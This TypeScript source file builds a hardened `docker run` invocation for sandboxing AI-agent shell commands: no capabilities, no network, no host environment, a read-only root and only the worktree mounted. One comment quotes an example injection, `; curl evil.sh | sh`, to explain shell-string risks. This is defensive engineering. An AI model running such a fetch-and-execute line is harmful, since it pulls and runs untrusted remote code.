/**
 * Runs agent-authored commands inside a container instead of on the runner VM.
 *
 * The division of labour matters more than any individual flag. The *driver*
 * stays on the host: it holds the task token and the clone token, and it does
 * the clone, the commit, the push and the PR. The *agent* gets a container with
 * the worktree bind-mounted and nothing else — no tokens, no `~/.gitconfig`, no
 * GitHub Actions environment, no network. Git operations are therefore mediated
 * outside the sandbox with scoped credentials, which is what stops "the agent
 * can run arbitrary bash" from meaning "the agent can push anywhere the runner
 * can".
 *
 * This is the boundary that regex command-classification cannot be. The
 * classifier stays as defence in depth — it refuses obviously destructive
 * commands early, with a better error than a container failure — but the thing
 * that actually holds is that the process has no credential to steal and no
 * socket to send it over.
 */

export interface ContainerSandboxConfig {
  /**
   * Immutable base image, pinned by digest.
   *
   * A tag is mutable: `node:20` today and `node:20` next month are different
   * images, so a run is not reproducible and a compromised tag is a supply
   * chain problem nobody would notice. A digest cannot be moved.
   */
  image: string;
  /** Host path of the task worktree. The only thing mounted. */
  worktreeHostPath: string;
  /** Where it appears inside the container. */
  workdir?: string;
  /**
   * Egress. `none` is the default and the only safe one: a build that needs
   * dependencies should have had them fetched by the driver, outside the
   * sandbox, before the agent ran.
   */
  network?: "none" | "proxied";
  /** Docker network name for the capability-aware egress proxy, when proxied. */
  proxyNetwork?: string;
  memory?: string;
  cpus?: string;
  pidsLimit?: number;
  /** Writable scratch inside the container, since the root filesystem is not. */
  tmpfsSizeMB?: number;
}

export const DEFAULT_CONTAINER_LIMITS = {
  memory: "2g",
  cpus: "2",
  pidsLimit: 512,
  tmpfsSizeMB: 512,
} as const;

/**
 * Builds the `docker run` argv for one command.
 *
 * Returned as an argv array, never as a shell string: the command is
 * agent-authored, and interpolating it into a shell line to be re-parsed is
 * how `; curl evil.sh | sh` becomes a second command. Here it is a single
 * argument to the container's own shell, which is the only thing that parses
 * it.
 */
export function buildContainerArgs(
  command: string,
  config: ContainerSandboxConfig
): string[] {
  const workdir = config.workdir ?? "/work";
  const limits = { ...DEFAULT_CONTAINER_LIMITS };

  const args = [
    "run",
    "--rm",
    // No stdin: nothing interactive can be waiting for input that never comes.
    "--interactive=false",
    // Drop every capability, then add nothing back. A build does not need to
    // change ownership, load modules or mount filesystems.
    "--cap-drop=ALL",
    // Stops a process gaining privileges through a setuid binary it wrote.
    "--security-opt=no-new-privileges",
    // The image is immutable at runtime too: only the worktree and the tmpfs
    // below are writable, so a command cannot leave anything behind in the
    // image layer for a later run to pick up.
    "--read-only",
    `--tmpfs=/tmp:rw,noexec,nosuid,size=${config.tmpfsSizeMB ?? limits.tmpfsSizeMB}m`,
    `--memory=${config.memory ?? limits.memory}`,
    // Without this a memory limit is advisory: the kernel swaps instead of
    // killing, and a runaway build takes the host down slowly rather than
    // failing fast.
    `--memory-swap=${config.memory ?? limits.memory}`,
    `--cpus=${config.cpus ?? limits.cpus}`,
    // The fork-bomb bound. Container memory limits alone do not stop one.
    `--pids-limit=${config.pidsLimit ?? limits.pidsLimit}`,
  ];

  if (config.network === "proxied" && config.proxyNetwork) {
    // A dedicated docker network whose only route out is the egress proxy, so
    // "allowed domains" is enforced by something the container cannot
    // reconfigure — rather than by an environment variable it could unset.
    args.push(`--network=${config.proxyNetwork}`);
  } else {
    args.push("--network=none");
  }

  // The only mount. Not the home directory, not the docker socket, not the
  // runner's checkout — any of which would hand back everything the container
  // exists to withhold.
  args.push(`--volume=${config.worktreeHostPath}:${workdir}`);
  args.push(`--workdir=${workdir}`);

  // No `--env` and no `--env-file`: the container starts with the image's
  // environment and nothing from the host. That is the credential boundary.
  args.push(config.image, "/bin/bash", "-c", command);
  return args;
}

/** Reads the sandbox configuration from the driver's environment. */
export function containerSandboxFromEnv(
  env: NodeJS.ProcessEnv,
  worktreeHostPath: string
): ContainerSandboxConfig | null {
  const image = env.JUNO_RUNNER_SANDBOX_IMAGE?.trim();
  if (!image) return null;
  const network = env.JUNO_RUNNER_SANDBOX_NETWORK?.trim();
  return {
    image,
    worktreeHostPath,
    network: network === "proxied" ? "proxied" : "none",
    proxyNetwork: env.JUNO_RUNNER_SANDBOX_PROXY_NETWORK?.trim() || undefined,
    memory: env.JUNO_RUNNER_SANDBOX_MEMORY?.trim() || undefined,
    cpus: env.JUNO_RUNNER_SANDBOX_CPUS?.trim() || undefined,
  };
}

/**
 * True when the image is pinned to a digest rather than a tag.
 *
 * Not enforced here — a deployment may knowingly run a tag while iterating —
 * but reported, so the audit trail records which of the two a run used.
 */
export function isImmutableImage(image: string): boolean {
  return /@sha256:[0-9a-f]{64}$/.test(image);
}
